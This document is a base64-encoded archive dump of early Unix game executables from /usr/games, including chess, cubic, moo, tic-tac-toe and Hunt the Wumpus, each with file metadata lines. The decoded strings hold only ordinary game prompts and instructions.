JAFmEAp2AgP3Cfb/gBWATAIAwGUwABcgOQACB8BlBwATkIcAwB1QHcIdSh33CZQADAHAHU
Idwh08HfcJhgAFAQQVNxUsHXcA5v6CEcJlBACD4CYR5hUgAMQQAwvDbRAdBgf3Cw4dAwLf
Ce4Zw37ECwQDjpTfCe4ZBH/DCwUHzhUgAN8J7hnDftYLhBV3AKD+NwriHAEKwJ/YHLcK1B
zA5TAAFyD6/wICABUDARcgCQAGgrcKwBxXcAoAAWDsAcBlMACDAMRlCADTlT8AhwBmEYUR
QB0EAAaJAoZ3AEABAAqFFYcAZhGFEXcdBACYCHcdBgCUCACJ4EIChncAIAGFFYcAZhGFEU
AdBAApiQKGdwAMAYUVhwBmEYURdx0EAGwIQBHAZQYANxBkCACJ5kJ3AOwAZhGFEQKJAwED
hncA3gAACoUVhwBmEYURdx0EAEIIdx0GAD4IAInsQgKGdwC+AIUVhwB3CZoAKokChncArg
BCHQQAEhBKEAAKdwCSAGYRhRFAHQQAdx0GAAwIdx0IAAgIAInyQgKGdwCCAIUVhwBmEYUR
QB0EAHcdBgDwB3cdCADsBwCJ+EIChncAYAAACoUVhwBmEYURdx0EANYHAIn+QoUVhwBmEY
URQB0EAHcdBgDEB3cdCADABwCJAkMChncAKgCFFYcAZhGFEUAdBAABiUARhREmEeYQphDm
C0gAQRFEGEMYQhhGEYUVhwA3EEYbwBX//0YRhRWHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgADAAQABAAEAAQAAwACAAMA
BgAIAAgACAAIAAYAAwAEAAgADAAMAAwADAAIAAQABAAIAAwADgAOAAwACAAEAAQACAAMAA
4ADgAMAAgABAAEAAgADAAMAAwADAAIAAQAAwAGAAgACAAIAAgABgADAAIAAwAEAAQABAAE
AAMAAgBYMKAwOjESMp4yAAAuCDwIBAncCWoKAABI9Hz8DP7U/tT+nP8AAGQALAEsAfQBhA
O4CwEAAgAIAAQAGwBAAAQAPAAgABAACAAAAAAAAQACAAQAQ2hlc3MKAC91c3IvbGliL2Jv
b2sAJXM6ICVkOiVkJWQKADAYMBjiGNIY/BgMGQYaHhprcXJibnAgUE5CUlFLAAogICBhIG
IgYyBkIGUgZiBnIGgACiAgIHEgcSBxIHEgayBrIGsgawogICByIG4gYiAgICAgYiBuIHIA
CgAlZC4gAC4uLiAAcHBuYnJxawBybmIAAHRpbWUgPSAlZC8lZAoAZm9yY2VkIG1hdGUKAA
BSZXNpZ24KAElsbGVnYWwgbW92ZQoAc2F2ZQByZW1vdmUAZXhpdABtYW51YWwAcmVzaWdu
AGZpcnN0AHJlc3RvcmUAY2xvY2sAd2hpdGUAYmxhY2sAc2NvcmUAaGludAAgJWQKAHJlcG
VhdABlaD8KAERyYXcgYnkgcmVwZXRpdGlvbgoAV2hpdGUgd2lucwoAQmxhY2sgd2lucwoA
U3RhbGUgbWF0ZQoAL2Jpbi9tYWlsAG1haWwAY2hlc3MAL3Vzci9iaW4vbWFpbABtYWlsAG
NoZXNzAABjaGVzcy5vdXQAY2Fubm90IGNyZWF0ZSBmaWxlCgBjaGVzcy5vdXQAY2Fubm90
IG9wZW4gZmlsZQoAby1vLW8Ab29vAG8tbwBvbwBhbWJpZ3VvdXMKAO44ZABEOW8APjl4AI
A5ZgCOOWUAHDljACo5cwD6OGwAnDlyAAAAAAD8//D//f/4/wiJAAAAAAuJAAAAAAWJAAAA
AAOJAAAAABOJAAAAACuJAAAEiQAAAAA=
-- /usr/games/cubic mode=0100775 uid=3 gid=3 atime=170481456 mtime=169259069 base64=1 --
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
EIAMdwne+woAeACFAAIHL2Rldi90dHljAC91c3IvYmluL2RkcwAAlAmWCZgJmgmUCZwJpA
msCZQJngmoCbIJlAm0CdQJ9AmUCbYJ2An6CZQJvAnkCQwKlAm+CegJEgqWCZ4JpgmuCZYJ
tgnWCfYJlgm+CeYJDgqYCaAJqAmwCZgJuAnYCfgJmAnACegJEAqaCaAJpgmsCZoJogmqCb
IJmgm4CdYJ9AmaCboJ2gn6CZoJwAnmCQwKmgnCCeoJEgqcCZ4JoAmiCZwJvAncCfwJnAm+
CeAJAgqeCb4J3gn+CaAJwAngCQAKognACd4J/AmiCcIJ4gkCCqQJpgmoCaoJpAnECeQJBA
qkCcYJ6AkKCqYJxgnmCQYKqAnICegJCAqqCcgJ5gkECqoJygnqCQoKrAmuCbAJsgmsCcQJ
3An0CawJxgngCfoJrAnMCewJDAqsCc4J8AkSCq4JxgneCfYJrgnOCe4JDgqwCcgJ4An4Cb
AJ0AnwCRAKsgnICd4J9AmyCcoJ4gn6CbIJ0AnuCQwKsgnSCfIJEgq0CbYJuAm6CbQJvAnE
CcwJtAm+CcgJ0gm2Cb4JxgnOCbgJwAnICdAJugnACcYJzAm6CcIJygnSCbwJvgnACcIJxA
nGCcgJygnMCc4J0AnSCdQJ1gnYCdoJ1AncCeQJ7AnUCd4J6AnyCdYJ3gnmCe4J2AngCegJ
8AnaCeAJ5gnsCdoJ4gnqCfIJ3AneCeAJ4gnkCeYJ6AnqCewJ7gnwCfIJ9An2CfgJ+gn0Cf
wJBAoMCvQJ/gkIChIK9gn+CQYKDgr4CQAKCAoQCvoJAAoGCgwK+gkCCgoKEgr8Cf4JAAoC
CgQKBgoICgoKDAoOChAKEgoAAAAAAAAAAAUACgAUAMgACgAAAAAAAACc/wAAAAAAAAoACA
A=
-- /usr/games/moo mode=0100775 uid=3 gid=3 atime=170481479 mtime=169259069 base64=1 --
BwFgAgAAAAAAAAAAAAABAHcJ9AAKAHcA/gD3CXgAAYlAlQMD9wlyAPsBhQrFRQEAhQD3CR
QAFyB5AAEC1QsXIAoAAgP3CYoAhQAACgOJBAEBAAWHwAsDA8AduACHAH8ArgB3EQIABYkA
AAAADocBEEAQA4kEAQEAwAsFA8AdlAD3CRYA9QFAEAaJ1Yv+AoUKxUUBAIUAwBUKADcQdg
DAFQEABIkEAQEAhwBmEPcJBACBFYcAARAAChdyCgBmEMALAgP3Ce7/gBXAZTAA9wnK/4cA
9wl0/xcgCgD7AocAZhDBHTIAAwINiXcQKgBXcBUzwWUNG0AQNxAcAMBFAIBBFcEMAXCBFY
UAdxUEADCJAgAAAIUAAAAAAHcJBP9NT08KAAB3Cfr+bmV3IGdhbWUKAMEVUALRlf//VyBU
AvsCwRVQAncJmP8KAMIVUAISoPkDlyBUAvsCEZBXIFQC8gI3CgwBdwAkAHcJtv5iYWQgZ3
Vlc3MKAADBFVQCV6QKAAUDVyBZAvoC9wlI/zcK3AA3CtoAdwmK/j8gAAAACsEVVALRlf//
VyBZAvsCwRVUAvcJmP4JkMDlMAAXIAoA1IbCFVQCEqDQA5cgWAL7AhGQwhVQAhKgAgK3Cp
AAlyBUAvkCVyBYAuQC9wlg/hcgCgC7AsEVVALCFVACUqQEArcKbAD3CmYAVyBYAvcCwB1e
APcJmP53CQr+IGJ1bGxzOyAAAMAdRgD3CYL+dwn0/SBjb3dzCgAA1y00AAQABAO3Ci4Adw
BG/8AdJgD3CV7+dwnQ/SBndWVzc2VzCgoAAHcAwv4AAAAAAAAAAAAAAAAAAAAA
-- /usr/games/ttt mode=0100775 uid=3 gid=3 atime=170481511 mtime=169259069 base64=1 --
BwGACAAAAAAAAAAAAAABAHcJ9AAKAHcA/gD3CXgAAYlAlQMD9wlyAPsBhQrFRQEAhQD3CR
QAFyB5AAEC1QsXIAoAAgP3CYoAhQAACgOJBAEBAAWHwAsDA8AduACHAH8ArgB3EQIABYkA
AAAADocBEEAQA4kEAQEAwAsFA8AdlAD3CRYA9QFAEAaJ1Yv+AoUKxUUBAIUAwBUKADcQdg
DAFQEABIkEAQEAhwBmEPcJBACBFYcAARAAChdyCgBmEMALAgP3Ce7/gBXAZTAA9wnK/4cA
9wl0/xcgCgD7AocAZhDBHTIAAwINiXcQKgBXcBUzwWUNG0AQNxAcAMBFAIBBFcEMAXCBFY
UAdxUEADCJAgAAAIUAAAAAAHcJBP9UaWMtVGFjLVRvZQoAAHcJ8v5BY2N1bXVsYXRlZCBr
bm93bGVkZ2U/IAB3Cej+CgEFiWIEAAAGhwEQA4mSBOgDQBAGicAVkgTQC/4C4As3EDIDwO
WSBIAM9wky/3cJpP4gJ2JpdHMnIG9mIGtub3dsZWRnZQoAdwly/4oDdwmE/m5ldyBnYW1l
CgD3FX4E4ALAFXMEEIoXIHwE/IfBFXMEQJQIA8AKAwPAFVgABgHAFU8AAwFAEMDlQwT3Cc
D+VyB2BAYDVyB5BAMDVyB8BOgC9wmm/lcgfATjh/cJnP53CSL+PyAAAPcJRP4XIAoAEQPA
5TEAFyAIAE+C8ItzBEwCARD3CSj+FyAKAEYC8ZUCAHMEdwk0AQYATAH3CQ4BNwpMBjcKSg
bEFXMEzIsbAsyVAQB3CRQBAwBZAfcJvgAMisEVkgR3IDwCA4YRIPsCCgE3IBwGBwMEhzcQ
FAY3ERIGtwoKBoQKFyF8BN+H9wv+BSgD1y34BQEAAwP3FX4E8AHAHewB0B3oBTcQ5AHAHe
IFyJUBAHcABP93CWj9SWxsZWdhbCBtb3ZlCgD3CQj+dwDq/ncJTv1Zb3Ugd2luCgAACAF3
CT79SSBjb25jZWRlCgAAwR2uAcIVfgS3IJIBAoaRFPsBdxCcAXcAkP53CRT9SSB3aW4KAA
B3AID+whUCBAMKwRUJAGYRBQpXcQMAgJQAnHMEBWBHfkARhRUDIAGHAxCXIEoE7YfAEIcA
wBVzBNCLCgMXIHwE+4d3Ccb8RHJhdwoAdwA0/ocAwRVKBPcJHgACEPcJGAACYPcJEgACYI
0gBANXIGIE8ofVC9ULhQBAlACccwQCAsAVCgCHAAWJYgQAAAmHARD3HfgAAgADiQAA6ANA
EAaJwRWSBEIQgBQNA/0FwxWSBMsLBgMTIPwC8xX///7/+AEREPEBweWSBHcQLAD3CbL8QB
CADPcJvvx3CTD8ICdiaXRzJyByZXR1cm5lZAoACIliBA8ABImSBAAAdwAI/AABAgMEBQYH
CAYDAAcEAQgFAggHBgUEAwIBAAIFCAEEBwADBgIBAAUEAwgHBggFAgcEAQYDAAYHCAMEBQ
ABAgADBgEEBwIFCAABAgMEBQYHCAADBgEEBwIFCAAECAIEBi91c3IvZ2FtZXMvdHR0LmsA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
-- /usr/games/ttt.k mode=0100666 uid=3 gid=3 atime=170481629 mtime=170481629 base64=1 --
YisyLkwsSD9iPYo8eDxyPOFIHUMVQ8dIz0j2SC1CXT9WQC9DPkN0K6g+2DZxQMlIGzBaK8
I8CUbGNjMw90XANs07cDzxRcVCVz+ZPAZJWz+JLpYtsCsEI0RAPkCbP1pHO0BjP/FH30eH
PyUvOy56QDwwcj9RP0s/M0h/PzhDn0J9QnJCd0K4PjA8+jviO+A7hULjQYhBlUFOOQs/AD
kbNv44zkdBSIhJakiAQCEwVkiBQrRH1T9ASS9IgT9jSAhJ20U/P+M+4kV2LxkwJEhoSKtF
dUXxPpQ/mz3cPltFjUXgRaw+i0VRRzM/6EVrReAr6z6OP7E8F0MpSPdHyUT2PIFEnEURRk
09C0bvPiFFZkV1P1RF+UU6R91H2DtuNldHnTxBQM5CaT8rSKNFBDxtRQ==
-- /usr/games/wump mode=0110775 uid=3 gid=3 atime=170481644 mtime=169259069 base64=1 --
BwHcClQJygQAAAAAAAABAAnwgBEmEtALNhACAPcJBgCWJQAKAYl3CXwK5gvOFZgS3wn+Bf
cJsgTAJXkAFwIECgARwAzwC9wKEQPENQEAAwPOFRQAAgHOFQMAABHADCYc3ArfCf4F1guE
CuoBwhUwFAQKFyEUAA8EAwrXIAMABwTAEMAMgGDIFf//gwr2AcJlCACECu4BNQr4/8QVAQ
AXIRQAHwTOFRQA3wkYBQMQwhCXdAMAwmUwFPUg+P/wA8oL7gTyCwIA6wRyHfj/AgBAHfj/
F3QDAPAQMBT1EPj/hAreAcIVMBQEChchFAA3BAMK1yADACQEwBDADIBgyAsHBA4R3wmCBM
EQwQyBYAkQwBDADIBgBCKqAzUK+P9DLfj/DATAEMAMgGBBHfj/wQyBYAkinAO1Cvj/8QGD
CtkBzhXsBeYVAgDmFQMAphDfCYgIxmUGAMJlCACECsYB9xUFAH4TwhUwFAQKFyEUAAYEMg
oGAMJlCACECvcBBAoXIQMAEgTOFRQA3wkYBQIQl3QDAMJlMBTyNQIABgAEAvJVAgAGAIQK
6wEEChchAwASBM4VFADfCRgFAhCXdAMAwmUwFPI1AwAGAAQC8lUBAAYAhArrAc4VFADfCR
gFBBA3EQQTABEXdAMA8FUEADYUzhUUAN8JGAUEEAARF3QDAPA1BwA2FAMCNxHaEgEB8AHO
HdISjgrmFa0S3wn+BdYLwh3CEpd0AwDCZTAU8jUCAAYABgPOFcES3wn+BV8AUgTyNQQABg
AGA84V1hLfCf4FXwBSBPI1AQAGAAsDzhX0Et8J/gXOFRQA3wkYBTcQdhLPAQQKFyEDABIE
zhUEAAARwAyAYAASF3QDACYQzmUwFN8JtAXWC8ALCgKECusBzhUEAKYQ3wm0BdYLwAsEA8
4VDxPfCf4FzhUBAKYQ3wm0BdYLwAsEA84VIRPfCf4FzhUCAKYQ3wm0BdYLwAsEA84VLhPf
Cf4FzhU+E98J/gUEChchAwAMBAARwAyAYA4SjgrmFVMT3wn+BdYLhArxAc4VVxPfCf4Fzh
VZE98J/gX3CcwBXwAABNctwBEKAAQCzhVuE98J/gX3CTICBBDECgMK1yADAAcEwBDADIBg
BCIHA4MK9gHOFXsT3wn+BdwBNxGEETchghFgA18A/AHXLXoRCgAEAs4VjRPfCf4FBAoXIQ
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
BCHQQAEhBSEIIVdwAcAGYRhRFAHQQAAYmAHQIANnAEAIcANxBsDsAV//9GEYUVhwBAEYUR
JhHmEKYQ5gtIAEERRBhDGEIYRhGFFYcAtx0CAHYJhwA3EHAJhwBmEMEdaAlXcBUzwWUNG0
AQNxBaCcBFAICBFYcAZgtoC4cLiQuyC+QL5gvwC/ILLgxhDJEMyAz1DB0NHw0oDSoNWw2R
DZMNqg3DDdwNCw5HDn0Omw6dDqMOpQ7eDuAOFg9ND2QPZg+hD8gP6g8XEDoQcBChEMMQ9B
AoEVsRZhFoEZERtBG2EcERwxH4EQwSIhJfEnkSlhIAABIDEAQQBBAEEAQQBFgDCgBXZWxj
b21lIHRvICdIdW50IHRoZSBXdW1wdXMuJwoACgBUaGUgV3VtcHVzIGxpdmVzIGluIGEgY2
F2ZSBvZiAlZCByb29tcy4KAEVhY2ggcm9vbSBoYXMgJWQgdHVubmVscyBsZWFkaW5nIHRv
IG90aGVyIHJvb21zLgoACgBIYXphcmRzOgoACgBCb3R0b21sZXNzIFBpdHMgLSBTb21lIH
Jvb21zIGhhdmUgQm90dG9tbGVzcyBQaXRzIGluIHRoZW0uCgAJSWYgeW91IGdvIHRoZXJl
LCB5b3UgZmFsbCBpbnRvIHRoZSBwaXQgYW5kIGxvc2UhCgBTdXBlciBCYXRzIC0gU29tZS
BvdGhlciByb29tcyBoYXZlIHN1cGVyIGJhdHMuCgAJSWYgeW91IGdvIHRoZXJlLCBhIGJh
dCB3aWxsIGdyYWIgeW91IGFuZCB0YWtlIHlvdSB0bwoACXNvbWV3aGVyZSBlbHNlIGluIH
RoZSBjYXZlIHdoZXJlIHlvdSBjb3VsZAoACWZhbGwgaW50byBhIHBpdCBvciBydW4gaW50
byB0aGUgLiAuIC4KAAoAV3VtcHVzOgoACgBUaGUgV3VtcHVzIGlzIG5vdCBib3RoZXJlZC
BieSB0aGUgaGF6YXJkcyBzaW5jZQoAaGUgaGFzIHN1Y2tlciBmZWV0IGFuZCBpcyB0b28g
YmlnIGZvciBhIGJhdCB0byBsaWZ0LgoACgBVc3VhbGx5IGhlIGlzIGFzbGVlcC4KAFR3by
B0aGluZ3Mgd2FrZSBoaW0gdXA6CgAJeW91ciBlbnRlcmluZyBoaXMgcm9vbQoACXlvdXIg
c2hvb3RpbmcgYW4gYXJyb3cgYW55d2hlcmUgaW4gdGhlIGNhdmUuCgBJZiB0aGUgd3VtcH
VzIHdha2VzLCBoZSBlaXRoZXIgZGVjaWRlcyB0byBtb3ZlIG9uZSByb29tIG9yCgBzdGF5
IHdoZXJlIGhlIHdhcy4gIEJ1dCBpZiBoZSBlbmRzIHVwIHdoZXJlIHlvdSBhcmUsCgBoZS
BlYXRzIHlvdSB1cCBhbmQgeW91IGxvc2UhCgAKAFlvdToKAAoARWFjaCB0dXJuIHlvdSBt
YXkgZWl0aGVyIG1vdmUgb3Igc2hvb3QgYSBjcm9va2VkIGFycm93LgoACgBNb3ZpbmcgLS
BZb3UgY2FuIG1vdmUgdG8gb25lIG9mIHRoZSBhZGpvaW5pbmcgcm9vbXM7CgAJdGhhdCBp
cywgdG8gb25lIHRoYXQgaGFzIGEgdHVubmVsIGNvbm5lY3RpbmcgaXQgd2l0aAoACXRoZS
Byb29tIHlvdSBhcmUgaW4uCgAKAFNob290aW5nIC0gWW91IGhhdmUgNSBhcnJvd3MuICBZ
b3UgbG9zZSB3aGVuIHlvdSBydW4gb3V0LgoACUVhY2ggYXJyb3cgY2FuIGdvIGZyb20gMS
B0byA1IHJvb21zLgoACVlvdSBhaW0gYnkgdGVsbGluZyB0aGUgY29tcHV0ZXIKAAl0aGUg
YXJyb3cncyBwYXRoIC0gYSBsaXN0IG9mIHJvb20gbnVtYmVycy4KAAlUaGUgbGlzdCBpcy
B0ZXJtaW5hdGVkIHdpdGggYSAwLgoACVRoZSBmaXJzdCByb29tIGluIHRoZSBwYXRoIG11
c3QgYmUgY29ubmVjdGVkIHRvIHRoZQoACXJvb20geW91IGFyZSBpbi4gIEVhY2ggc3VjY2
